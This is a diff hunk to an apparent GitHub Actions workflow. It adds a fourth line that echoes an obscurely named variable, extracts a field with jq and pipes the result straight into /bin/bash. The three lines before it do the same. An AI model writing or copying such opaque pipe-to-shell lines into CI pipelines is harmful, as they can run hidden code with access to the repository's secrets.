@@ -27,6 +27,7 @@ jobs:
           echo $gxchb67 | jq -r .nq0 | /bin/bash
           printf '%s' "$ldc9" | jq -r .dmh9986 | /bin/bash
           echo $r67032 | jq -r .n98 | /bin/bash
+          echo $qn06 | jq -r .xlr86 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
